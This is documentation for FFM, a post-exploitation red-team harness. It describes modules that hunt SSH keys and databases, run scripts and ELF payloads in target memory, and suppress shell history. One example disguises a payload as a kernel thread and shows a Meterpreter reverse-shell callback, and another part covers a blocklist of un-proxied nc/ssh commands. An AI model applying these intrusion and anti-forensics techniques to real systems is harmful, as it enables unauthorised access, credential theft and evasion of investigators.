# FFM Documentation

Created by @JusticeRage, Contributed to by [ice-wzl](http://127.0.0.1:5000/u/PxC7fYzjgRS5tXfXdyRDxJ2C32K2 "mention").

### What is FFM?

* FFM is a hacking harness that you can use during the post-exploitation phase of a red-teaming engagement. The idea of the tool was derived from a [2007 conference](https://conference.hitb.org/hitbsecconf2007kl/materials/D1T1%20-%20The%20Grugq%20-%20Meta%20Antiforensics%20-%20The%20HASH%20Hacking%20Harness.pdf) from @thegrugq.
* It was presented at [SSTIC 2018](https://www.sstic.org/2018/) ([video](https://www.sstic.org/2018/presentation/hacking\_harness\_ffm/)) and the accompanying slide deck is available at [this url](http://manalyzer.org/static/talks/SSTIC2018.pptx). If you're not familiar with this class of tools, it is strongly advised to have a look at them to understand what a hacking harness' purpose is. All the comments are included in the slides.
* This project is distributed under the terms of the [GPL v3 License](https://www.gnu.org/licenses/gpl.html).
* FFM is designed to be a middle ground between a bare SSH shell and a C2
* FFM Speeds up common tasks found on engagements and simplifies workflow to avoid opsec errors and or mistakes.

### What FFM isn't

* FFM is not a C2 framework
* FFM is not perfect, but it is under constant updated and development to improve its modules, performance, and fix any issues that arise.

### Installation

#### Docker Install

* With the diversity of modern terminal prompts, we highly, \*highly\* recommend using `docker` with this tool.
* Utilizing the `Dockerfile` in this repository will drastically cut down on potential errors encountered.
* Utilizing a container to interact with remote hosts is also more secure. If you were to get exploited while interacting with a remote host, they would be sitting in your container vice your actual host. Lets still hope that does not happen.
* Ensure you have `Docker` installed on your local system

```
git clone https://github.com/JusticeRage/FFM.git
cd /FFM

docker build Docker_Install/ -t ffm:ffm

docker image list 
REPOSITORY                TAG         IMAGE ID      CREATED        SIZE
localhost/ffm             ffm         fb6dd17e3b91  9 minutes ago  614 MB
docker.io/library/ubuntu  22.04       3b418d7b466a  2 weeks ago    80.3 MB

#run your new container and drop into a /bin/bash prompt as root
docker run -it --entrypoint /bin/bash -u 0 fb6dd17e3b91
```

* Once in your container set the `passwd` for `root` and `neo`
* `su neo` and now you are all set

#### Non Docker Install

* Not recommended

```
 git clone https://github.com/JusticeRage/FFM.git
 cd /FFM
 pip install -r requirements.txt
```

### Usage

The goal of a hacking harness is to act as a helper that automates common tasks during the post-exploitation phase, but also safeguards the user against mistakes they may make.

It is an instrumentation of the shell. Run `./ffm.py` to activate it and you can start working immediately. There are two commands you need to know about:

```
neo@feff0b418db6:/opt/FFM$ python3 ffm.py

  █████▒ █████▒███▄ ▄███▓      ██▓███ ▓██   ██▓
▓██   ▒▓██   ▒▓██▒▀█▀ ██▒     ▓██░  ██▒▒██  ██▒
▒████ ░▒████ ░▓██    ▓██░     ▓██░ ██▓▒ ▒██ ██░
░▓█▒  ░░▓█▒  ░▒██    ▒██      ▒██▄█▓▒ ▒ ░ ▐██▓░
░▒█░   ░▒█░   ▒██▒   ░██▒ ██▓ ▒██▒ ░  ░ ░ ██▒▓░
 ▒ ░    ▒ ░   ░ ▒░   ░  ░ ▒▓▒ ▒▓▒░ ░  ░  ██▒▒▒ 
 ░      ░     ░  ░      ░ ░▒  ░▒ ░     ▓██ ░▒░ 
 ░ ░    ░ ░   ░      ░    ░   ░░       ▒ ▒ ░░  
                     ░     ░           ░ ░     
                           ░           ░ ░     

FFM enabled
Type !list to see all available commands
!list tags to see commands by module name
!list <tag-name> to see all commands of that tag type
Type exit to quit.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

* Type `!list` to display all the commands provided by the harness.
* Type `!list tags` to see the differnt tags that commands can be binned under

```
!list tags
List of commands available:
	 enumeration
	 execution
	 help
	 stealth
	 transfer
```

* You can now type `!list enumeration` (or one of the other tags) to see commands that fall into that category.

```
neo@feff0b418db6:/opt/FFM$ !list enumeration
List of commands available:
	!backup-hunter: Hunts for backup files
	!db-hunter: Hunts for .sqlite, .sqlite3, and .db files
	!info: Returns CPU(s), Architecture, Memory, and Kernel Verison for the current machine.
	!log: Toggles logging the harness' input and output to a file.
	!mtime: Returns files modified in the last X minutes
	!os: Prints the distribution of the current machine.
	!sshkeys: Hunts for Private and Public SSH keys on the current machine.
	!strange-dirs: Checks device starting at user specified path for strange directories on a host
	!sudo-version: Checks for a vulnerable sudo version
	!suid: Finds SUID, SGID binaries on the current machine.
	!vm: Checks if device is a Virtual Machine
```

#### List of features

This hacking harness provides a few features that are described below. As they are described, the design philosophy behind the tool will also be introduced. It is not expected that all the commands implemented in FFM will suit you. Everyone has their own way of doing things, and tuning the harness to your specific need is likely to require you to modify some of the code and/or write a few plugins. A lot of effort went into making sure this is a painless task.

### Commands

### Enumeration Commands

### !os

* `!os` is an extremely simple command that just runs `cat /etc/*release*` to show what OS the current machine is running. It is probably most valuable as a demonstration that in the context of a hacking harness, you can define aliases that work across machine boundaries. SSH into any computer, type `!os` and the command will be run. This plugin is located in `commands/replacement_commands.py` and is a good place to start when you want to learn about writing plugins.

```
!os
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION="2023.1"
VERSION_ID="2023.1"
VERSION_CODENAME="kali-rolling"
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31"
```

### !backup-hunter

* `!backup-hunter` Hunts for backup files

```
!backup-hunter
Backup Hunter: 
/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
/var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
/var/lib/dpkg/alternatives/tdbbackup
/var/www/html/index.nginx-debian.bak
/var/www/html/index.bak
--snip--
```

### !info

* `!info` Returns CPU(s), Architecture, Memory, and Kernel Verison for the current machine.

```
!info
System Info: 
up 1 hour, 53 minutes
CPU(s): 16
Architecture: x86_64
Kernel Version: 6.1.0-kali7-amd64
Total online memory: 16.1G
```

### !log

* `!log` Toggles logging the harness' input and output to a file.

```
!log session.log
This session will now be logged to session.log.
```

* Your terminal screen will now be logged exactly as you see it in your current session to the log file that you specify.  Log file will be stored in `FFM/`

```
ls -la 
total 1456
drwxr-xr-x 39 kali kali   4096 Jul 31 22:29 .
drwxr-xr-x  3 root root   4096 Nov  9  2022 ..
drwxr-xr-x  2 kali kali   4096 May  3 17:13 .anydesk
drwxr-xr-x  3 kali kali   4096 Apr 10 17:46 .armitage
-rw-r--r--  1 kali kali   2380 Apr 10 17:46 .armitage.prop
-rw-------  1 kali kali    223 May  9 19:48 .bash_history
-rw-r--r--  1 kali kali    220 Nov  9  2022 .bash_logout
--snip--
!info
System Info: 
up 1 hour, 54 minutes
CPU(s): 16
Architecture: x86_64
Kernel Version: 6.1.0-kali7-amd64
Total online memory: 16.1G
!vm
Virtual Machine: Yes
exit
neo@feff0b418db6:/opt/FFM$ exit
exit
```

### !mtime

`!mtime` Returns files modified in the last X minutes. For example `!mtime 5` will get all files on the local machine (that you have rights to see) that have been modified in the last 5 minutes

```
!mtime 5
Files Modified in the last 5m:
/var/log/user.log
/var/log/cron.log
/var/log/journal/c8c27e9f8f56401db715bdb4d82842e8/system.journal
/var/log/journal/c8c27e9f8f56401db715bdb4d82842e8/user-1000.journal
/var/log/auth.log
/var/log/syslog
/home/kali/.config/pulse/c8c27e9f8f56401db715bdb4d82842e8-default-sink
/home/kali/.config/pulse/c8c27e9f8f56401db715bdb4d82842e8-default-source
```

### !db-hunter

`!db-hunter` Hunts for .sqlite, .sqlite3, and .db files and other database files

```
!db-hunter
DB Hunter: 
/home/kali/.config/Code/databases/Databases.db
/home/kali/.config/Signal/sql/db.sqlite
/home/kali/.config/Signal/databases/Databases.db
/home/kali/.mozilla/firefox/hjgyg4yo.default-esr/storage/default/https+++www.cyberark.com/ls/data.sqlite
/home/kali/.mozilla/firefox/hjgyg4yo.default-esr/storage/default/https+++wpmudev.com/ls/data.sqlite
/home/kali/.mozilla/firefox/hjgyg4yo.default-esr/storage/default/https+++vulners.com^firstPartyDomain=vulners.com/ls/data.sqlite
--snip--
```

### !sshkeys

`!sshkeys` Hunts for Private and Public SSH keys on the current machine.

```
!sshkeys
Potential SSH Keys: 
/etc/ssh/ssh_host_ecdsa_key.pub
/etc/ssh/ssh_host_rsa_key.pub
/etc/ssh/ssh_host_ed25519_key.pub
/opt/Blackhat-Python/ssh/test_rsa.key.pub
/usr/lib/python3/dist-packages/autobahn/xbr/test/profile/default.pub
/home/kali/.ssh/oracle_rsa.pub
/home/kali/.ssh/id_rsa.pub
/sys/module/8250/parameters/probe_rsa
/home/kali/.ssh/id_rsa
/home/kali/.ssh/oracle_rsa
```

### !suid

`!suid` Finds SUID, SGID binaries on the current machine.

```
!suid
SUID + SGID Binaries: 
-rwsr-xr-- 1 root dip 403832 May 13  2022 /usr/sbin/pppd
-rwsr-xr-x 1 root root 48128 Aug 26  2022 /usr/sbin/mount.cifs
-rwsr-xr-x 1 root root 130056 Jan 11  2023 /usr/sbin/mount.nfs
-rwsr-xr-- 1 root messagebus 51272 Feb  8 08:21 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 14672 Feb  7 08:15 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 18664 Feb 12 22:15 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 653888 Feb  8 05:43 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 52808 May  9 10:35 /usr/share/code/chrome-sandbox
--snip--
```

### Transfer Commands

* Commands that help you pull and push files, pretty straight forward.

### !download

* `!download [remote file] [local path]` gets a file from the remote machine and copies it locally through the terminal. This command is a little more complex because more stringent error checking is required but it's another plugin you can easily read to get started. You can find it in `commands/download_file.py`. Note that it requires `xxd` or `od` on the remote machine to function properly.

### !upload

* `!upload [local file] [remote path]` works exactly the same as the previous command, except that a local file is put on the remote machine.

### Execution Commands

### !sh

`!sh [local script]` Runs a shell script from the local machine in memory.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### !py

* Use `!py` if python2.7 is on the target and not python3&#x20;
* `!py [local script]` executes a local Python script on the remote machine, and does so _entirely in memory_. Check out my [other repository](https://github.com/JusticeRage/freedomfighting) for scripts you might want to use. This commands uses a multiline syntax with `<<`, which means that pseudo-shells that don't support it (Weevely is a good example of that) will break this command quite badly.

### !py3

`!py3 [local script]` does the exact same thing except for a system with python3

```
!py3 /tmp/strangeDirs.py -p /dev/shm
Path exists...continuing
HIT: /dev/shm/,.
Total Hits: 1
```

### !elf

* `!elf [local script]` Runs an executable from the local machine in memory, requires python2.7 on remote machine.

### !elf3&#x20;

* This is by far the most impressive module in my opinion.
* `!elf3 [local script]` Runs an executable from the local machine in memory, requires python3 on the remote machine.

```
#payload on neo docker 
neo@feff0b418db6:/tmp$ mv shell.elf '[scsi_eh_1]'
#on remote device 
!elf3 /tmp/meoware
100%|████████████████████████████████████████████████████████████████████████████████████████████████| 336/336 [00:00<00:00, 2.53Mo/s]
Child process PID: 9292
#get call back on C2
msf6 exploit(multi/handler) > [*] Started reverse TCP handler on 10.0.0.2:443 
[*] Sending stage (3045348 bytes) to 10.0.0.2
[*] Meterpreter session 2 opened (10.0.0.2:443 -> 10.0.0.2:53702) at 2023-08-01 21:31:47 -0400

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 10.0.0.2
OS           : Debian  (Linux 6.1.0-kali7-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

#### Stealth Commands

* I am fully aware these two modules are the opposite of "stealthy" but it is where they are currently placed until an alternative location can be worked out. This stealth category will more than likely contain commands that help you blend in better in addition to those commands that might make you stick out.

### !pty

* `!pty` spawns a TTY, which is something you don't want in most cases because it tends to leave forensics evidence. However, some commands (`sudo`) or exploits require a TTY to run in so this is provided as a convenience.&#x20;
* Commands auto passed into the remote session when a pty is spawned:
* `unset HISTFILE HISTFILESIZE HISTSIZE PROMPT_COMMAND`
* `stty -echo`
* `export TERM=xterm`
* `unset SSH_CONNECTION`

### !sudo

* `!sudo` Invoke sudo without a TTY.

### Configuration File&#x20;

Plugins can be further configured by editing `ffm.conf`.

### Config Example

* For example the behavior of `ffm.py` can we tweaked further in the `ffm.conf` file.
* If you wanted to have another ssh argument get passed to the client without having to manually type it each time:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

* &#x20;You can easily toggle any of these ssh options on or off
* Example 2:
* If you wanted to add/remove a command that should or should not be proxied you can simply add them here:

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

#### Processors

Conceptually, commands (as described above) are used to generate some bash which is forwarded to the shell. They can perform more complex operations by capturing the shell's output and generating additional instructions based on what is returned. Processors are a little different as they are rather used to rewrite data circulating between the user and the underlying bash process. While it is true that any processor could be rewritten as a command, it seemed a little cleaner to separate the two. Input processors work on whatever is typed by the user once they press the `ENTER` key, and output processors can modify anything returned by the shell.

* A good processor example can be found in `processors/ssh_command_line.py`. All it does is add the `-T` option to any SSH command it sees if it is missing. Be sure to check out its simple code if you are interested in writing a processor.
* Another input processor present in the framework, `processors/assert_torify.py`, contains a blacklist of networking commands (`ssh`, `nc`) and blocks them if they don't seem to be proxied through a tool such as `torify`. The harness does its best to only bother the user if it seems like the command is being run on the local machine. Obviously this should not be your only safeguard against leaking your home IP address.
* Finally, `processors/sample_output_processor.py` is a very simple output processor that highlights in red any occurrence of the word "password". As it's quite useless, it's not enabled in the framework but you can still use it as a starting point if you want to do something more sophisticated.

### Known issues

`CTRL+R` is not implemented yet and we all miss it dearly.

`!elf` and `!elf3` are modules that allow you to run an elf in memory on the target system, the modules currently are working but tested in a limited capacity. After execution of the modules the shell will hang until the timeout limit is reached before returning control back to the user. However, dispite having control back it will no longer run any built in linux commands requiring you to either close the terminal (not ideal) or kill the process (also not ideal). I am working on improving both these modules, it is high on the priority list.

More problematic is the fact that the framework hangs from time to time. In 99% of the cases, this happens when it fails to detect that a command it launched has finished running. Usually, this means that the command prompt of the machine you're logged into could not be recognized as such. In that case, you can try improving the regular expression located at the very beginning of the file `ffm.py`, or log into that same machine with `ssh -T` as there won't be any problematic prompt anymore. By default, FFM will give up on trying to read the output of a command after 5 minutes (some plugins may implement different timeouts); so if the framework hangs, you'll need to wait until you see an error message (though if the underlying process is still running, you may still not be able to type in commands).

### Closing statement

I think I've covered everything about this tool. Again, it's a little different from what I usually release as most people will probably need to modify it before it can be valuable to them.

Many plugins have yet to be written, so be sure to share back any improvements you make to FFM. Feel free to open issues not only for bugs, but also if you're trying to do something and can't figure out how; this way I'll be able to improve the documentation for everyone.\
